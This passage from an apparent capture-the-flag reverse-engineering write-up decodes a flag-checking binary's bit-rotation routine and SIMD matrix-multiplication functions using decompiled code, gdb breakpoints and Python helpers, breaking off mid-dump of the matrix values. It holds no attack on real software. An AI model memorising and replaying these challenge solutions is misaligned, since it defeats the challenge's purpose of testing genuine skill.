bit of a1)and store it in<code>[rbp+var_50]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">int</span> v46; <span class="comment">// [rsp+14h] [rbp-124h]  </span></span><br><span class="line">v46 = <span class="number">4</span> - a2;</span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vmovdqa xmm0, [rbp+var_50]</span><br><span class="line">    vmovd   xmm1, [rbp+var_124]</span><br><span class="line">    vpsrld  xmm0, xmm0, xmm1</span><br><span class="line">    vmovdqa xmm2, xmm0</span><br><span class="line">    vmovdqa xmm0, [rbp+var_E0]</span><br><span class="line">    vmovdqa [rbp+var_60], xmm0</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>this part, <code>xmm0</code> get the content of <code>[rbp+var_50]</code>(which is <code>a1&amp;0x0f</code> ) and <code>xmm1</code> get the content of <code>[rbp+var_124]</code>(which is <code>v46</code>. It is set to <code>4- a2</code>) .By the code  <code>vpsrld  xmm0, xmm0, xmm1</code> ,we get <code>(a1&amp;0f)&gt;&gt;(4-a2)</code>)and store it in <code>[rbp+var_60]</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> v45; <span class="comment">// [rsp+10h] [rbp-128h]</span></span><br><span class="line">v45 = a2;</span><br><span class="line"> __asm</span><br><span class="line"> &#123;</span><br><span class="line">   vmovdqa xmm0, [rbp+var_60]</span><br><span class="line">   vmovd   xmm1, [rbp+var_128]</span><br><span class="line">   vpslld  xmm0, xmm0, xmm1</span><br><span class="line">   vmovdqa [rbp+var_80], xmm0</span><br><span class="line">   vmovdqa [rbp+var_70], xmm2</span><br><span class="line">   vmovdqa xmm1, [rbp+var_80]</span><br><span class="line">   vmovdqa xmm0, [rbp+var_70]</span><br><span class="line">   vpor    xmm0, xmm1, xmm0</span><br><span class="line">   vmovdqa [rbp+var_C0], xmm0</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>in this part ,like we just analysis ,It first get <code>(((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2</code> (By code <code>vpslld  xmm0, xmm0, xmm1</code> ,<code>xmm0</code> is <code>(a1&amp;0f)&gt;&gt;(4-a2)</code> ,<code>xmm1</code> is <code>v45</code>,which is set to a2) and store it in <code>[rbp+var_80]</code></p><p>By the code <code>vpor    xmm0, xmm1, xmm0</code>,we get  <code>((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;(4-a2)</code> (<code>xmm1</code> is from the result of <code>vpslld</code> we just get, and <code>xmm0</code> ,which is from <code>xmm2</code>  -&gt;from <code>vpsrld  xmm0, xmm0, xmm1</code>  -&gt;<code>(a1&amp;0f)&gt;&gt;(4-a2)</code>)and store it in <code>[rbp+var_C0]</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">char v41; &#x2F;&#x2F; [rsp+8h] [rbp-130h]</span><br><span class="line">v41 &#x3D; 0xF;</span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">  vpbroadcastb xmm0, [rbp+var_130]</span><br><span class="line">  vmovdqa xmm1, xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_C0]</span><br><span class="line">  vmovdqa [rbp+var_100], xmm0</span><br><span class="line">  vmovdqa [rbp+var_110], xmm1</span><br><span class="line">  vmovdqa xmm1, [rbp+var_100]</span><br><span class="line">  vmovdqa xmm0, [rbp+var_110]</span><br><span class="line">  vpand   xmm0, xmm1, xmm0</span><br><span class="line">  vmovdqa xmm1, xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_F0]</span><br><span class="line">  vmovdqa [rbp+var_B0], xmm0</span><br><span class="line">  vmovdqa [rbp+var_D0], xmm1</span><br><span class="line">  vmovdqa xmm0, [rbp+var_B0]</span><br><span class="line">  vmovdqa xmm1, [rbp+var_D0]</span><br><span class="line">  vpor    xmm0, xmm1, xmm0</span><br><span class="line">  vmovdqa [rbp+var_A0], xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_A0]</span><br><span class="line">  vmovdqa [rbp+var_90], xmm0</span><br><span class="line">  vmovdqa xmm0, [rbp+var_90]</span><br><span class="line">  vmovd   eax, xmm0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>just the same way ,we get <code>(((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;(4-a2)) &amp;0xf</code> and store it in <code>[rbp+var_D0]</code>,by <code>vpor    xmm0, xmm1, xmm0</code> ,we get <code>((((((a1&amp;0f)&gt;&gt;(4-a2)))&lt;&lt; a2) | (a1&amp;0f)&gt;&gt;a2) &amp;0xf)| (x&amp;0xf0)</code></p><p>Actually, if we draw to help us understand ,we could find that it is just a simple switch of bit</p><p>if we set a2 to be 3,it may like:a1  -&gt;  [7|6|5|4|3|2|1|0] ,the lowest 4 bit -&gt;[3|2|1|0] ,part 1 we get [3|2|1|0] &gt;&gt;(4-3)&lt;<3 ,which is [3|2|1|0|0|0], part 2 we get  [3|2|1|0]>&gt;(4-1) ,which is [3|2|1] ,and we and them and get [3|2|1|3|2|1] ,and we and 0xf get [1|3|2|1]. last we  or the x&amp;0xf0, finally get [7|6|5|4|1|3|2|1] .It’s just swtich the a2 highest bit of a2’s lowest 4 bit and (4-a2) lowest bit of a2 ‘s  lowest 4 bit</p><p>obviously, it’s reversible</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">1</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">3</span>))&amp;<span class="number">15</span>))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rev_rc</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">3</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">1</span>))&amp;<span class="number">15</span>))</span><br></pre></td></tr></table></figure><h4 id="matmult-SSE4"><a href="#matmult-SSE4" class="headerlink" title="matmult_SSE4"></a>matmult_SSE4</h4><p>Next we analysis the function called <code>matmult_SSE4</code> . We will use gdb to debug it and guess something (You can just read the assembly code like above analysis,But it’s not fun)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">matmult_SSE4</span><span class="params">(__int64 ans, __int64 matrix_1, __int64 matrix_2, __m128 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+3Ch] [rbp-44h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    lincomb_SSE(((__int64)i &lt;&lt; <span class="number">6</span>) + matrix_1, matrix_2, a3);</span><br><span class="line">    __asm &#123; vmovapd zmmword ptr [rsp+<span class="number">80</span>h+var_40], zmm0 &#125;</span><br><span class="line">    result = ans + ((__int64)i &lt;&lt; <span class="number">6</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">80</span>h+var_40]</span><br><span class="line">      vmovapd zmmword ptr [rax], zmm0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>you may think it ‘s a function to mult two matrix subconsciously.But if you notice the function called <code>lincomb_SSE</code>,you may think the <code>matmult_SSE4</code> function is used to mult matrix and vector.After all, the second parameter (which is matrix_2) of  <code>lincomb_SSE</code> don’t change.Apparently, there should be a matrix and a columns vector. And each time the cow of matrix lincomb with the columns vector.You may get the info that the size of  matrix is 32*16(In <code>lincomb_SSE</code> there are 16 times add,and in <code>matmult_SSE4</code>, there are 32 times add.It was natural to think the matrix is 32*16)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">lincomb_SSE</span><span class="params">(__int64 A, __int64 a2, __m128 _XMM0)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1DCh]</span></span><br><span class="line"></span><br><span class="line">  __asm</span><br><span class="line">  &#123;</span><br><span class="line">    vxorpd  xmm0, xmm0, xmm0</span><br><span class="line">    vmovsd  [rsp+<span class="number">188</span>h+var_1D8], xmm0</span><br><span class="line">    vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1D8]</span><br><span class="line">    vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_1C0], zmm0</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    _RAX = a2 + ((__int64)i &lt;&lt; <span class="number">7</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovsd  xmm0, qword ptr [rax]</span><br><span class="line">      vmovsd  [rsp+<span class="number">188</span>h+var_1C8], xmm0</span><br><span class="line">      vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1C8]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_140], zmm0</span><br><span class="line">    &#125;                                           <span class="comment">// matrix2的操作</span></span><br><span class="line">    _RDX = A;</span><br><span class="line">    result = i;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">      vmovsd  xmm0, qword ptr [rdx+rax*<span class="number">8</span>]       <span class="comment">// ans</span></span><br><span class="line">      vmovsd  [rsp+<span class="number">188</span>h+var_1D0], xmm0</span><br><span class="line">      vbroadcastsd zmm0, [rsp+<span class="number">188</span>h+var_1D0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_80], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_140]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_40], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_80]</span><br><span class="line">      vmulpd  zmm0, zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_40]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_C0], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_1C0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_100], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_C0]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_180], zmm0</span><br><span class="line">      vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_180]</span><br><span class="line">      vaddpd  zmm0, zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_100]</span><br><span class="line">      vmovapd zmmword ptr [rsp+<span class="number">188</span>h+var_1C0], zmm0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; vmovapd zmm0, zmmword ptr [rsp+<span class="number">188</span>h+var_1C0] &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>But,really?</p><p>Let’s be out of the matmult function and observe the main function,you can see that a paramter called <code>A</code> in<code>.data</code> is passed to the matmult function .It occupies <code>2048</code> bytes.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">matmult_SSE4((__int64)v29, (__int64)A, (__int64)v28, _XMM0);</span><br></pre></td></tr></table></figure><p>By reading the assembly  code you can know that the result is stored in <code>v29</code>(or you can guess it.<code>A</code> is the matrix to be mul, and <code>v28</code> store the flag strings processed by <code>rc</code>.So the result can only stored in <code>v29</code> )</p><p>And Let ‘s  analysis the <code>lincomb_SSE</code> function and see which data is used</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000000017F7 mov     rdx, [rsp+188h+var_1F0]</span><br><span class="line">.text:00000000000017FC mov     eax, [rsp+188h+var_1DC]</span><br><span class="line">.text:0000000000001800 cdqe</span><br><span class="line">.text:0000000000001802 shl     rax, 7</span><br><span class="line">.text:0000000000001806 add     rax, rdx</span><br><span class="line">.text:0000000000001809 vmovsd  xmm0, qword ptr [rax] &#x2F;&#x2F;!</span><br><span class="line">.text:000000000000180D vmovsd  [rsp+188h+var_1C8], xmm0</span><br><span class="line">.text:0000000000001813 vbroadcastsd zmm0, [rsp+188h+var_1C8]</span><br><span class="line">.text:000000000000181B vmovapd zmmword ptr [rsp+188h+var_140], zmm0</span><br><span class="line">.text:0000000000001826 mov     rdx, [rsp+188h+var_1E8]</span><br><span class="line">.text:000000000000182B mov     eax, [rsp+188h+var_1DC]</span><br><span class="line">.text:000000000000182F cdqe</span><br><span class="line">.text:0000000000001831 vmovsd  xmm0, qword ptr [rdx+rax*8]</span><br><span class="line">.text:0000000000001836 vmovsd  [rsp+188h+var_1D0], xmm0</span><br><span class="line">.text:000000000000183C vbroadcastsd zmm0, [rsp+188h+var_1D0]</span><br><span class="line">.text:0000000000001844 vmovapd zmmword ptr [rsp+188h+var_80], zmm0</span><br><span class="line">.text:000000000000184F vmovapd zmm0, zmmword ptr [rsp+188h+var_140]</span><br><span class="line">.text:000000000000185A vmovapd zmmword ptr [rsp+188h+var_40], zmm0</span><br><span class="line">.text:0000000000001865 vmovapd zmm0, zmmword ptr [rsp+188h+var_80]</span><br><span class="line">.text:0000000000001870 vmulpd  zmm0, zmm0, zmmword ptr [rsp+188h+var_40]</span><br><span class="line">.text:000000000000187B vmovapd zmmword ptr [rsp+188h+var_C0], zmm0</span><br><span class="line">.text:0000000000001886 vmovapd zmm0, zmmword ptr [rsp+188h+var_1C0]</span><br><span class="line">.text:0000000000001891 vmovapd zmmword ptr [rsp+188h+var_100], zmm0</span><br><span class="line">.text:000000000000189C vmovapd zmm0, zmmword ptr [rsp+188h+var_C0]</span><br><span class="line">.text:00000000000018A7 vmovapd zmmword ptr [rsp+188h+var_180], zmm0</span><br><span class="line">.text:00000000000018B2 vmovapd zmm0, zmmword ptr [rsp+188h+var_180]</span><br><span class="line">.text:00000000000018BD vaddpd  zmm0, zmm0, zmmword ptr [rsp+188h+var_100]</span><br><span class="line">.text:00000000000018C8 vmovapd zmmword ptr [rsp+188h+var_1C0], zmm0</span><br><span class="line">.text:00000000000018D3 inc     [rsp+188h+var_1DC]</span><br></pre></td></tr></table></figure><p>Obviously, the element of the vector is obtain at  <code>0000000000001809</code> and stored in <code>[rsp+188h+var_140]</code>  ,the element of matrix is obtain at <code>0000000000001831</code> .the code at <code>0000000000001870</code> mul them(there is some code store and obtain,just trace the regs and memory and you can get what the operator is)</p><p>And ,the code at <code>00000000000018BD</code> to accumulate the sum.</p><p>So,We can set break point at  <code>0x0000000000001809</code> ,<code>0000000000001831</code> and  <code>00000000000018BD</code> to obverse.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p &amp;main-0x1100</span><br><span class="line"><span class="variable">$97</span> = (&lt;text variable, no debug info&gt; *) 0x564bb9367000</span><br><span class="line">(gdb) <span class="built_in">set</span> <span class="variable">$base</span>=0x564bb9367000</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x0000000000001809)</span><br><span class="line">Breakpoint 20 at 0x564bb9368809</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x0000000000001831)</span><br><span class="line">Breakpoint 21 at 0x564bb9368831</span><br><span class="line">(gdb) b *(<span class="variable">$base</span>+0x00000000000018bd)</span><br><span class="line">Breakpoint 22 at 0x564bb93688bd</span><br><span class="line">(gdb)</span><br></pre></td></tr></table></figure><p>and send flag  “1234” ,which is pad to “1234”+”X”*(16-4).After rc, it is traslate to something below</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc</span>(<span class="params">x</span>):</span></span><br><span class="line"><span class="keyword">return</span> ((x&amp;<span class="number">0xf0</span>)|((((x&amp;<span class="number">0xf</span>)&gt;&gt;<span class="number">1</span>)|((x&amp;<span class="number">0xf</span>)&lt;&lt;<span class="number">3</span>))&amp;<span class="number">15</span>))</span><br><span class="line">m = [<span class="number">49</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">52</span>]+[<span class="number">88</span>]*<span class="number">12</span></span><br><span class="line">tc = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">    tc.append(rc(i<span class="number">-33</span>))</span><br><span class="line">print(tc)</span><br><span class="line"><span class="comment">#[16, 24, 17, 25, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59]</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/29/yYdKx8TCa64Dbor.png" alt="image-20230829234137537"></p><p>Yes, the first element in vector is 16,and we go on.</p><p><img src="https://s2.loli.net/2023/08/29/G8rNAXUd5RxMj1h.png" alt="image-20230829234308013"></p><p>The second element is 55.which is just the first element in A (in double)</p><p><img src="https://s2.loli.net/2023/08/29/26Tu1XtrLpc4jfy.png" alt="image-20230829234422865"></p><p>so this round ,the num to be add is 55*16 = 880 </p><p><img src="https://s2.loli.net/2023/08/29/KzwnlyV8LZ6tgHJ.png" alt="image-20230829234547650"></p><p>so we can know that after 16 rounds ,the answer is the line comb of <code>[16, 24, 17, 25, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59, 59]</code> and <code>[55,81,66,68,86,67,51,34,88,43,44,70,65,51,93,54]</code>,which is 49660</p><p>So we can set break point at 0x193e to see if our guess is true</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000001939 call    _Z11lincomb_SSERKDv8_dRK5Mat16</span><br><span class="line">.text:000000000000193E vmovapd zmmword ptr [rsp+80h+var_40], zmm0</span><br></pre></td></tr></table></figure><p>it’s true.</p><p><img src="https://s2.loli.net/2023/08/29/g7diEhCQq8Wz5lJ.png" alt="image-20230829235122809"></p><p>but wait,we know that A occupies 2048 bytes,and each element in it occupies 8 bytes.So it has 256 elements.So it is a matrix of 16*16.Why in matmult_SSE4 it gets 32 rounds.</p><p>We can ignore it temporarily.We can abstract the element in A first and to see if every round of line comb is true</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">k = [<span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;86&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;34&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;43&#x27;</span>, <span class="string">&#x27;44&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;82&#x27;</span>, <span class="string">&#x27;59&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;55&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;40&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;93&#x27;</span>, <span class="string">&#x27;41&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;78&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;37&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;71&#x27;</span>, <span class="string">&#x27;64&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;90&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;57&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;75&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;48&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;73&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;51&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;49&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;52&#x27;</span>, <span class="string">&#x27;95&#x27;</span>, <span class="string">&#x27;32&#x27;</span>, <span class="string">&#x27;83&#x27;</span>, <span class="string">&#x27;65&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;53&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;74&#x27;</span>, <span class="string">&#x27;42&#x27;</span>, <span class="string">&#x27;81&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;63&#x27;</span>, <span class="string">&#x27;85&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;89&#x27;</span>, <span class="string">&#x27;50&#x27;</span>, <span class="string">&#x27;62&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;47&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;39&#x27;</span>, <span class="string">&#x27;56&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;61&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;36&#x27;</span>, <span class="string">&#x27;84&#x27;</span>, <span class="string">&#x27;70&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;58&#x27;</span>, <span class="string">&#x27;68&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;33&#x27;</span>, <span class="string">&#x27;77&#x27;</span>, <span class="string">&#x27;91&#x27;</span>, <span class="string">&#x27;88&#x27;</span>, <span class="string">&#x27;87&#x27;</span>, <span class="string">&#x27;46&#x27;</span>, <span class="string">&#x27;66&#x27;</span>, <span class="string">&#x27;67&#x27;</span>, <span class="string">&#x27;60&#x27;</span>, <span class="string">&#x27;80&#x27;</span>, <span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span class="string">&#x27;69&#x27;</span>, <span class="string">&#x27;45&#x27;</span>, <span class="string">&#x27;54&#x27;</span>, <span class="string">&#x27;79&#x27;</span>, <span 